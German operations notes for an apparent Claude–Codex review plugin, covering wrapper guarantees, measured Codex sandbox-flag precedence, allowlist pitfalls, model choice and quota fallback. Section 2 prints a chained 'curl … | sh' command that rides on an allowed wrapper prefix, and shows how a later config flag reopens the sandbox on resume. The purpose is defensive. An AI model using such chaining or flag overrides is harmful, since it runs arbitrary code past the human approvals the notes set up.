# claudex-loop — verifizierte Betriebsnotizen

Gilt für alle Projekte, die den claudex-loop nutzen, **Windows wie macOS**. Was hier
steht, ist gegen `codex-cli 0.149.1` **gemessen**, nicht vermutet; wo etwas nur plausibel
ist, steht es dabei.

Diese Datei hieß bis zum 28.08.2026 `betrieb-windows.md` und war als Sammlung von
„Abweichungen vom Original-Skill unter Windows" gebaut. Das trägt nicht mehr: der Wrapper
ist plattformneutral und hat die meisten dieser Abweichungen geschluckt. Geblieben ist die
eigentlich wertvolle Hälfte — **was gemessen wurde**. Sie steht jetzt dort, wo sie
hingehört: als Begründung hinter dem, was der Wrapper tut.

> **Namen seit 27.08.2026:** `codex-review` → **`plan-review`** (prüft den Plan, vor dem
> Code), `codex-verify` → **`code-review`** (prüft den fertigen Diff gegen den Plan). Die
> alten Namen waren gegenüber dem Sprachgebrauch vertauscht; ältere Protokolle führen sie
> noch.

---

## 1. Was der Wrapper garantiert — und warum

Kanonisch ist `scripts/codex_ro.py` in diesem Repo. Der `setup`-Skill kopiert ihn je Repo
nach `tools/codex_ro.py`; `scripts/wrapper_drift.py` meldet zurückliegende Kopien und hebt
sie mit `--update` an. **Nicht abschreiben, nicht neu bauen** — am 28.08.2026 existierten
sieben Kopien in drei Ständen, die beiden CRITICAL-Fixes jenes Tages in genau einer davon.

Jede Zeile der folgenden Tabelle war einmal eine verlorene Stunde:

| Der Wrapper erledigt | Warum es sonst weh tut |
| --- | --- |
| Pfade nach Plattform normalisieren | `codex.exe` ist ein Windows-Binary und versteht Git-Bash-Pfade wie `/tmp/x` nicht — es schreibt ins Leere, ohne zu klagen. |
| Prompt über **stdin** | Argumente werden nicht gequotet; ein mehrwortiger Prompt zerfällt in Einzelargumente. Zugleich liest `codex exec` stdin **zusätzlich** zum Prompt-Argument: ohne EOF hängt es unter einem nicht-interaktiven Treiber ewig bei ~0 % CPU. Der stdin-Weg löst beides mit einer Entscheidung. |
| stderr in eine **Datei** | Ein abgelaufener Token liefert Exit 0, eine gültige `thread_id` und eine **leere** Verdict-Datei. Der 401 steht ausschließlich in stderr. `2>/dev/null` verschluckt genau diesen Fall. |
| Timeout (Vorgabe 600 s) | Ein Stall soll laut scheitern statt stumm zu hängen. Über das Bash-Tool zusätzlich `timeout: 600000` setzen — der 2-Minuten-Default killt echte Reviews mittendrin. |
| MCP-Server je Aufruf abschalten | Sie bringen für einen Review nichts und kosten Startzeit. ⛔ `-c mcp_servers="{}"` wirkt **nicht** (getestet, die Server starten trotzdem) — nur der dotted-path-Weg `-c mcp_servers.<name>.enabled=false` je Server greift. |
| read-only hart setzen | `-s read-only` bei `exec`; beim `resume` gibt es **kein** `-s`, dort geht es nur über `-c sandbox_mode=read-only`. Jedes weitere `-c sandbox_mode` / `approval_policy` / `sandbox_permissions` wird mit Exit 2 abgewiesen. |
| Pfadargumente einsperren | Der Wrapper löscht seine Ausgabedatei vor jedem Lauf. Ein unbegrenztes Pfadargument wäre damit ein Schreib-Primitiv auf die ganze Platte. Erlaubt sind Repo und Temp-Verzeichnis, mehr nur per `--allow-path` / `CLAUDEX_ALLOWED_PATHS`. |

**Aufruf:**

```bash
python tools/codex_ro.py --prompt-file p.txt  --out-file "$SCRATCH_DIR/verdict-r1.txt"
python tools/codex_ro.py --resume <thread-id> --prompt-file p2.txt \
                         --out-file "$SCRATCH_DIR/verdict-r2.txt"
```

Auf macOS heißt der Interpreter in der Regel `python3`. Exit-Codes: `0` Antwort da,
`1` leere Antwort bei Exit 0 (der Auth-Fall), `2` abgewiesen, `124` Timeout,
`127` kein codex gefunden, sonst codex' eigener Code.

⛔ **Auch Ping und Resume laufen über den Wrapper.** Ein direkter `codex exec` umgeht
Sandbox-Pin, Pfadgrenzen, stderr-Datei, Timeout und MCP-Abschaltung auf einmal — und
genau dann, wenn man es eilig hat.

⚠️ Der Wrapper braucht ein **Git-Verzeichnis** als Arbeitsverzeichnis, sonst verweigert
Codex mit „Not inside a trusted directory". Das ist kein Schikane-Check: er begrenzt
Codex' Schreibwurzel auf das Repo. ⛔ Die Flagge, die die Fehlermeldung nennt
(`--skip-git-repo-check`), wird **nie** gesetzt — unter `-s read-only` ist sie nur
sinnlos, unter `build`s `--yolo` hebt sie die Grenze auf. Greenfield: erst `git init`.

### Wohin die Dateien gehen

`SCRATCH_DIR` ist **keine konfigurierte Größe**, sondern wird zur Laufzeit aufgelöst: das
Scratchpad des Harness, wenn es eines stellt, sonst `<repo>/.claudex-tmp/`, im selben
Schritt angelegt und gitignoriert. Es gehört deshalb **nicht** in die `.env` — die hält
Reviewer-Zugänge, und zwei Quellen für dieselbe Sache driften.

⛔ **Nie `/tmp`.** Weltlesbar, also liegen Plan-Kritiken dort für jeden anderen Nutzer der
Maschine offen; unter macOS zusätzlich ein Symlink auf `/private/tmp`, was den Abgleich
gegen `git rev-parse --show-toplevel` bricht (das löst Symlinks auf, Transkript-Pfade
nicht). Dateinamen **je Runde** — ein fester Name, jede Runde überschrieben, vernichtet
bei einem fehlgeschlagenen Schreibvorgang still die Kritik der Vorrunde, und eine
verlorene Kritik sieht aus wie eine Runde ohne Funde.

Dauerhaft ins Repo gehören Plan und Review-Log; alles andere ist Zwischenablage. **Eine
Runde ist erst fertig, wenn ihre Ausgabe im Log steht.**

---

## 2. Was der Wrapper *nicht* kann: Sandbox und Freigaben

Gemessen mit `codex-cli 0.149.1`, jeweils Schreibversuch in ein leeres Git-Verzeichnis,
**mit Positivkontrolle** — ohne die wäre ein „schreibt nicht" wertlos, weil es auch heißen
könnte, dass die Probe nie schreibt:

| Aufruf | schreibt? | heißt |
|---|---|---|
| `exec -s read-only` | nein | Basislinie |
| `exec -s read-only -c sandbox_mode="danger-full-access"` | **nein** | **`-s` gewinnt gegen nachgestelltes `-c`** |
| `exec -s danger-full-access` | ja | Positivkontrolle — die Probe erkennt eine offene Sandbox |
| `resume -c sandbox_mode="read-only" -c sandbox_mode="danger-full-access"` | **ja** | **späteres `-c` gewinnt** |

Daraus folgt: bei `codex exec` mit explizitem `-s read-only` ist der **Sandbox-Modus**
nicht mehr aufreißbar; bei `codex exec resume` schon, weil es dort kein `-s` gibt und das
letzte `-c` gewinnt.

⛔ **Hier stand bis zum 28.08.2026 der Satz „eine Präfix-Regel wäre für `exec` technisch
dicht". Er war in seinem eigenen Rahmen wahr und trotzdem gefährlich** — und er ist die
Ursache eines CRITICAL-Befunds. Er denkt nur über das Sandbox-Flag nach. Eine
Allowlist-Regel deckt aber den **Anfang des Kommandos**, nicht das Kommando: was hinter
dem erlaubten Präfix steht, läuft auf derselben Freigabe mit.

```
python tools/codex_ro.py --out-file v.txt && curl http://example.com/x.sh | sh
```

Der Wrapper nagelt Codex' Sandbox fest. Er hat nichts darüber zu sagen, was hinter seinem
Aufruf im selben Kommando steht. **Der Wrapper allein macht eine Freigabe nicht sicher.**

Die zweite Hälfte ist ein **PreToolUse-Hook** des Plugins (`hooks/wrapper_guard.py`). Er
weist jeden Wrapper-Aufruf ab, der Verkettung, Pipe, Umleitung, Kommandosubstitution oder
unbalancierte Anführungszeichen mitführt — und unterscheidet dabei *Aufruf* von *Erwähnung*:
ein `grep` nach dem Dateinamen ist keine Ausführung.

**Solange der Hook nicht im laufenden Betrieb nachweislich abgelehnt hat, gehört keine
Wrapper-Zeile in die Allowlist.** Freigegeben ist dann nur `Bash(codex --version)`; Preis
sind rund sechs Rückfragen über fünf Runden — genau an dieser Stelle soll ein Mensch sehen,
in welcher Sandbox Codex startet. Ist der Hook geprüft, darf zurück:

```json
"Bash(python tools/codex_ro.py*)",
"Bash(python3 tools/codex_ro.py*)"
```

⚠️ **Eine breite Interpreter-Freigabe hebelt das alles aus.** `Bash(*)`, `Bash(powershell:*)`,
`Bash(python tools/*)`, `Bash(sed *)`, `Bash(awk *)`, `Bash(find *)` — jede davon führt
beliebigen Code aus, und die sorgfältig verengte codex-Zeile daneben ist Dekoration. Vor
dem Berufen auf die Regel die eigene `settings.local.json` prüfen; der `setup`-Skill bringt
dafür einen Detektor mit (Schritt 0).

---

## 3. Modell und MCP

**Modell für die Angriffsrunde pinnen.** Der Original-Skill rät vom `-m`-Pin ab — das
zielte auf die alten `*-codex`-Slugs. Ein Pin läuft unter ChatGPT-Auth einwandfrei, kein
HTTP 400.

⛔ **`terra`, nicht `sol`.** An einem 120-Zeilen-Plan mit Repo-Kontext lief `sol`/high in
den 10-Minuten-Timeout (Exit 143), die Verdict-Datei kam erst auf der Ziellinie.
`gpt-5.6-terra` mit `model_reasoning_effort="high"` lieferte dieselbe Schärfe in
**1–2 Minuten je Runde**. Die frühere `sol`-Empfehlung stammte aus einem
8-Sekunden-Smoketest, nicht aus einem Review.

**Die eine Ausnahme: der Exposure-Pass.** `code-review` und `audit` schicken alles, was
aus dem Netz erreichbar ist (Routen, Auth, Webhooks, `ports:`, Proxy-/Tunnel-Config), in
eine eigene Sitzung auf der Rolle `exposure-review` — Vorgabe `gpt-5.6-sol` mit
`medium`. Das geht, weil der Input begrenzt ist: nur die exponierten Komponenten,
nicht der ganze Diff. Ein stärkeres Modell bei mittlerem Effort über wenig Text bleibt
unter dem Ceiling; ein anderes Modell macht den Pass zur zweiten Meinung statt zum
längeren Blick derselben. Modell und Effort kommen aus
`python scripts/claudex_roles.py --spec exposure-review`, nie aus dem Skill.

Verfügbar sind `gpt-5.6-sol` / `-terra` / `-luna`, Effort bis `ultra`. Der Wrapper nimmt
`terra`/high als Vorgabe. ⛔ `gpt-5.4` und `gpt-5.4-mini` verschwinden am **31.08.2026**
aus Codex.

**MCP** schaltet der Wrapper selbst ab (`CLAUDEX_DISABLE_MCP` überschreibt die Auswahl,
leerer Wert schaltet nichts ab). Die Messung dahinter steht in §1: nur der dotted-path-Weg
greift. Ein kaputter MCP-Eintrag in `~/.codex/config.toml` meldet sich als 404 oder 401 in
der stderr-Datei; für Reviews ist das harmlos, gehört aber repariert — und wenn dort ein
Klartext-Token steht, gehört es in den Vault (`codex mcp add --bearer-token-env-var`).

---

## 4. Zwei Lehren aus dem ersten echten Lauf (26.08.2026)

**1. Codex sieht `PLAN.md` nicht zuverlässig — Plantext inline in den Prompt.** Im ersten
Lauf wurden *alle* Shell-Aufrufe von Codex mit `rejected: blocked by policy` abgewiesen,
und die frisch angelegte `PLAN.md` war noch untracked. Ergebnis: Codex reviewte den
Code-Kontext, aber **nicht den Plan** — und sagte das immerhin dazu. Eine ganze Runde für
halbe Arbeit. Repo-Dateien liest Codex weiterhin selbst; nur auf die eigene, oft untrackte
Plandatei ist kein Verlass.

**2. `MAX_ROUNDS` zu erreichen ist kein Misserfolg.** Der erste Lauf endete formal ohne
`APPROVED`, war aber konvergiert: 11 → 9 → 5 → 5 → 1 Funde, ab Runde 2 kein einziger
begründet abgelehnt. Aussagekräftiger als das Verdikt ist die **Fundkurve** plus die
Frage, wie viele Funde man begründet zurückweisen konnte.

---

## 5. Voraussetzungen

| | |
|---|---|
| `codex --version` | muss eine Version **ausgeben**; gefordert ≥ 0.130, gemessen mit 0.149.1 |
| `codex login status` | `Logged in using ChatGPT` (Abo, **kein** API-Key) |
| Python | 3.10+ für Wrapper, Drift-Prüfung und Hook |
| Plugin | `claudex-loop@claudex-loop`, enabled |

⛔ **Leere Ausgabe plus Exit ≠ 0 ist weder ein Hänger noch ein Auth-Problem**, sondern ein
totes Binary — nicht wiederholen. Exit 137 (SIGKILL) unter macOS heißt: eine alte
npm-globale Installation überschattet das aktuelle CLI, das inzwischen **in der
ChatGPT-App** liegt (`/Applications/ChatGPT.app/Contents/Resources/codex`). Abhilfe: dieses
Binary in ein PATH-Verzeichnis vor der alten Installation verlinken, dann lässt der
*Nutzer* `sudo npm uninstall -g @openai/codex` laufen (braucht sein Passwort).
⛔ `~/.codex/` **nicht** löschen — `config.toml`, `auth.json` und die Sessions liegen dort
und werden vom gebündelten Binary weiter genutzt. Der Wrapper erkennt und benennt diesen
Fall. `CLAUDEX_CODEX_BIN` gibt es seit 2.3.0 nicht mehr (Audit 2026-09-02, CRITICAL: eine
per Umgebung gesetzte Variable durfte auf einem unbeaufsichtigten, allowlisteten Aufruf
nicht mehr bestimmen dürfen, welches Programm als „Codex" läuft) — den Symlink-Fix oben
anwenden, dann findet die PATH-Suche das Bundle selbst.
(Upstream [issue #10](https://github.com/chaseai-yt/claudex-loop/issues/10))

**Immer aus dem Repo-Root starten.** Codex lädt von dort automatisch die `AGENTS.md` — der
Prüfkatalog steht darin — und nur dieser Pfad steht in `~/.codex/config.toml` als
`trust_level = "trusted"`.

---

## 6. Kontingent-Ausfall: Fallback oder Überspringen statt Dead-End

Upstream-Problem ([claudex-loop#7](https://github.com/chaseai-yt/claudex-loop/issues/7)):
läuft das Codex-Kontingent (5-h- oder Wochenfenster des ChatGPT-Abos) mitten im Loop aus,
endet der Skill im Nichts. **Regel: erkennen, Restkontingent und Reset-Zeit nennen, dann
entscheidet der NUTZER** — warten, Fallback-Reviewer, oder die Review-Phase geloggt
überspringen. Nie still, nie automatisch. Ein Same-Model-Review durch Claude selbst ist
KEIN Ersatz für den Cross-Model-Check und wird nicht als solcher verkauft.

### Restkontingent abfragen — lokal, ohne API-Call

Codex schreibt nach jedem Turn einen `rate_limits`-Snapshot in die Session-Rollouts
(`~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl`): `primary` = 5-h-Fenster, `secondary` =
Wochenfenster, je `used_percent` + `resets_at`, dazu `credits.balance`. Verifiziert
27.08.2026 gegen codex-cli 0.149.1.

```bash
python scripts/codex_usage.py            # menschenlesbar, Exit 1 ab 95 % Verbrauch
python scripts/codex_usage.py --json     # Roh-Snapshot
```

Der Snapshot ist so alt wie der letzte Lauf. Nach längerer Pause frischt ihn ein Ping über
den Wrapper auf (~20k Input-Tokens, im Fenster ein Rundungsfehler).

### Protokoll im Loop

1. **Vor Runde 1:** `codex_usage.py`. Exit 1 → gar nicht erst starten, Verbrauch und
   Reset-Zeit nennen, entscheiden lassen.
2. **Erkennung im Lauf** (stderr-Datei lesen — deshalb nie `/dev/null`): 429 / „usage
   limit" / „quota" in stderr, `rate_limit_reached_type` ≠ null im Rollout, oder das
   bekannte Muster *Exit 0 + gültige thread_id + leere Verdict-Datei* (auch ein 401 sieht
   so aus).
3. **Kein blinder Retry.** Loop anhalten, Ursache und Reset-Zeit nennen, Nutzer wählt:
   **warten** (danach `--resume $THREAD_ID`, der Session-Kontext bleibt; ist der Thread
   weg, frische Session mit dem bisherigen Log inline), **Fallback-Reviewer** (unten),
   **überspringen** mit explizitem Log-Eintrag — der Plan gilt dann als *nicht
   cross-reviewed* — oder **abbrechen**.
4. Die Fundkurve-Regel gilt sinngemäß: ein nach N Runden abgebrochener Lauf mit
   dokumentierten Runden ist mehr wert als ein erzwungenes „APPROVED" von einem
   Ersatz-Reviewer, der nur abnickt.

### Fallback-Reviewer über `.env`-Profile

`scripts/fallback_review.py` spricht jeden OpenAI-kompatiblen Endpoint — LM Studio, Ollama,
OpenRouter, OpenAI, Gemini (`…/v1beta/openai`), Anthropic (`api.anthropic.com/v1`). Profile
in die **gitignorierte** `.env`, Schlüssel nach Vault-Regel nie inline:

```text
CLAUDEX_REVIEWERS=lmstudio,openrouter
CLAUDEX_REVIEWER_LMSTUDIO_BASE_URL=http://127.0.0.1:1234/v1
CLAUDEX_REVIEWER_LMSTUDIO_MODEL=qwen/qwen3.8-27b
CLAUDEX_REVIEWER_OPENROUTER_BASE_URL=https://openrouter.ai/api/v1
CLAUDEX_REVIEWER_OPENROUTER_MODEL=deepseek/deepseek-r1
CLAUDEX_REVIEWER_OPENROUTER_API_KEY_ENV=OPENROUTER_API_KEY
```

`--list` zeigt das Konfigurierte, `--reviewer <name>` wählt, **`--check` prefligtet alle
Provider** (lokal nur Erreichbarkeit; OpenRouter echtes Restguthaben via `/credits`;
OpenAI/Gemini/Anthropic haben keine Guthaben-API — Erschöpfung zeigt sich erst als 402/429
bei Nutzung), **`--chain` arbeitet die `CLAUDEX_REVIEWERS`-Reihenfolge als Kette ab**,
erster verfügbarer Provider gewinnt, jeder Skip wird mit Grund ausgewiesen.

Eigenschaften, bewusst anders als der Codex-Pfad:

- **Read-only per Konstruktion** — das Modell bekommt keinerlei Datei- oder Tool-Zugriff;
  Plan und bisheriger Log gehen inline. Kein „hoffentlich hält sich die CLI daran".
- **Kein Session-Gedächtnis** — die API ist stateless; Folgerunden bekommen den bisherigen
  Log per `--log` inline (Ersatz für `resume`).
- **Anti-Rubber-Stamping** — eine `VERDICT:`-Zeile ist Pflicht; ein APPROVED in Runde 1 mit
  < 3 nummerierten Befunden gilt als **ungültiges Review** (Exit 3), nicht als Freigabe.
- **Plan-Hash-Bindung** — SHA256 des Plans steht im Verdict-Header; ein Verdict gilt nur
  für exakt diesen Planstand.
- **Datenschutz umgekehrt** — bei einem lokalen Provider verlässt nichts die Maschine; der
  Codex-Tabu-Scope (Begründung: Upload zu OpenAI) greift dort nicht. Für
  kundendatenlastige Pläne ist der lokale Reviewer der *bessere* Kanal.
- **Log-Kennzeichnung Pflicht** — `## Round <n> — <Modell> (via <reviewer>, fallback)`.
  Ein APPROVED von dort wiegt weniger als eines von Codex/terra; bei hochriskanten Plänen
  nach dem Reset eine Codex-Bestätigungsrunde nachziehen.

⛔ **Findings-Ledger-Regel (alle Skills, alle Reviewer, alle Phasen):** jede
Reviewer-Ausgabe — Codex-Runde, Fallback-Runde (auch ein ungültiger Versuch, so
gekennzeichnet), Cold-Read, Post-Build-Inspection, Recheck, code-review-Pass — wird
**sofort wörtlich** in den Review-Log geschrieben, gefolgt von der Disposition je Befund
(akzeptiert → was geändert / abgelehnt → warum). Nichts lebt nur im Chat; was nicht im Log
steht, ist nicht passiert. Für Fallback-Runden macht das `--append-log <LOG_FILE>`
mechanisch.

---

## 7. Die Skills dieses Forks

Alles **Plugin-Skills** dieses Repos, nicht user-scope installiert:

| Skill | Wofür |
|---|---|
| `claudex-loop` | die vier Phasen: Recon, Interrogate, Review, Build |
| `plan-review` | Plan-Gate — Codex greift den Plan an, bevor Code existiert |
| `build` | Codex baut den eingefrorenen Plan, Claude liest den Diff |
| `code-review` | Abnahme-Gate nach dem Build, `scope=dod,quality,security,docs,tests` |
| `docs-backfill` | stehende Dokumentationsschuld an Code-Einheiten (keine Prosa) |
| `audit` | erster Durchgang über Code, den nie jemand geprüft hat; erzeugt eine Baseline |
| `setup` | richtet ein Repo ein: Wrapper, Reviewer-Rolle, Prüfkatalog, Tabu-Scope, Trust |

```
/claudex-loop:code-review scope=dod,security \
    SPEC_FILE=<plan-ordner>/PLAN.md LOG_FILE=<plan-ordner>/PLAN-REVIEW-LOG.md
```

Für alle gelten dieselben Ausfall-Szenarien wie in §6: Preflight, bei Ausfall warten /
Fallback / geloggt überspringen. Der Adapter kann die Gate-Grammatik fahren:
`--require-verdicts "DOD:COMPLETE|INCOMPLETE,QUALITY:ACCEPTABLE|REVISE,SECURITY:PASS|FAIL"`
mit Spec und Diff in **einer** Eingabedatei (Fallbacks sehen nur Inline-Text). E2E getestet
27.08.2026: toter Provider übersprungen, das Ersatzmodell fand die gesäte SQL-Injection und
fehlende Plan-Schritte (`DOD: INCOMPLETE | SECURITY: FAIL`, 3 Befunde).
